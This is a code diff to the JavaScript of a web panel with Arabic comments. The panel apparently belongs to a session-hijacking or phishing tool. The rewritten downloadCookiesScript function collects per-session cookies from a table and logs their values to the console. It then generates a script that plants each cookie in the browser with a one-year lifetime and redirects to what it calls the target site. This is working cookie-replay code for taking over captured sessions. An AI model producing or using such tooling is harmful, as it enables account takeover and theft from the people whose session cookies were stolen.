@@ -1392,7 +1392,6 @@ function setupEventListeners() {
 
 // Add download cookies script
 function downloadCookiesScript() {
-    // الحصول على معرف الجلسة من زر التنزيل بدلاً من العنصر النصي
     const downloadBtn = document.getElementById('download-cookies-btn');
     const sessionId = downloadBtn.dataset.sessionId;
     
@@ -1401,27 +1400,83 @@ function downloadCookiesScript() {
         return;
     }
     
-    // إنشاء رابط التنزيل
-    const downloadUrl = `/api/sessions/${sessionId}/cookies-script`;
+    // الحصول على الكوكيز من الجدول
+    const cookiesTable = document.getElementById('cookies-table');
+    const rows = cookiesTable.querySelectorAll('tbody tr');
     
-    // Create a dummy anchor element for download
+    // التحقق من وجود كوكيز
+    if (rows.length === 0 || (rows.length === 1 && rows[0].cells.length === 1)) {
+        showToast('خطأ', 'لا توجد كوكيز لهذه الجلسة', 'error');
+        return;
+    }
+    
+    // إنشاء صفيف للكوكيز
+    const cookies = [];
+    rows.forEach(row => {
+        // تجاوز الصفوف التي تحتوي على رسائل (مثل "No cookies available")
+        if (row.cells.length === 1) return;
+        
+        cookies.push({
+            domain: row.cells[0].textContent,
+            name: row.cells[1].textContent,
+            value: row.cells[2].textContent
+        });
+    });
+    
+    // ***** طباعة الكوكيز في سجلات المتصفح بشكل مفصل *****
+    console.log('%c🍪 كوكيز الجلسة ' + sessionId, 'font-size:14px; font-weight:bold; color:#3498db;');
+    console.log('%c=================================', 'color:#3498db;');
+    
+    cookies.forEach((cookie, index) => {
+        console.log(
+            `%c[${index+1}] ${cookie.name}%c\nDomain: ${cookie.domain}\nValue: ${cookie.value}`, 
+            'font-weight:bold; color:#2ecc71;', 
+            'color:#95a5a6;'
+        );
+    });
+    
+    console.log('%c=================================', 'color:#3498db;');
+    console.log('%cعدد الكوكيز: ' + cookies.length, 'font-weight:bold;');
+    
+    // إنشاء نص JavaScript لتعيين الكوكيز
+    let jsCode = `// تنزيل الكوكيز للجلسة ${sessionId}\n`;
+    jsCode += `// تاريخ التنزيل: ${new Date().toLocaleString()}\n\n`;
+    jsCode += `!function(){\n`;
+    jsCode += `    console.log("جاري إعداد الكوكيز...");\n\n`;
+    
+    // إضافة كل كوكي إلى النص
+    cookies.forEach(cookie => {
+        jsCode += `    // إعداد كوكي ${cookie.name}\n`;
+        jsCode += `    document.cookie = "${cookie.name}=${cookie.value};`;
+        if (cookie.domain) jsCode += `domain=${cookie.domain};`;
+        jsCode += `path=/;Max-Age=31536000;Secure;SameSite=None";\n`;
+        jsCode += `    console.log("تم إعداد الكوكي: ${cookie.name}");\n\n`;
+    });
+    
+    jsCode += `    console.log("تم إعداد جميع الكوكيز بنجاح!");\n`;
+    jsCode += `    alert("تم إعداد الكوكيز بنجاح! يمكنك الآن الانتقال للموقع المستهدف.");\n`;
+    jsCode += `    // الانتقال إلى الموقع المستهدف\n`;
+    if (cookies.length > 0 && cookies[0].domain) {
+        jsCode += `    window.location.href = "https://${cookies[0].domain}";\n`;
+    } else {
+        jsCode += `    // window.location.href = "https://example.com";\n`;
+    }
+    jsCode += `}();`;
+    
+    // إنشاء ملف نصي
+    const blob = new Blob([jsCode], { type: 'application/javascript' });
+    const url = URL.createObjectURL(blob);
+    
+    // إنشاء رابط تنزيل
     const downloadLink = document.createElement('a');
-    downloadLink.href = downloadUrl;
-    downloadLink.target = '_blank';
-    downloadLink.download = `cookies_${sessionId}.js`;
+    downloadLink.href = url;
+    downloadLink.download = `cookies_${sessionId}_${Date.now()}.js`;
     
-    // محاولة التنزيل والإبلاغ عن الحالة
-    showToast('جاري المعالجة', 'جاري تنزيل سكريبت الكوكيز...', 'info');
-    
-    // تسجيل بيانات التنزيل للتصحيح
-    console.log('تنزيل الكوكيز:', downloadUrl);
-    
-    // إضافة الرابط إلى المستند وتنفيذ النقر
+    // تنزيل الملف
     document.body.appendChild(downloadLink);
     downloadLink.click();
-    
-    // إزالة الرابط من المستند
     document.body.removeChild(downloadLink);
     
-    showToast('نجاح', 'تم بدء تنزيل سكريبت الكوكيز', 'success');
+    // إظهار رسالة نجاح
+    showToast('نجاح', 'تم إنشاء سكريبت الكوكيز بنجاح وطباعته في سجلات المتصفح', 'success');
 } 
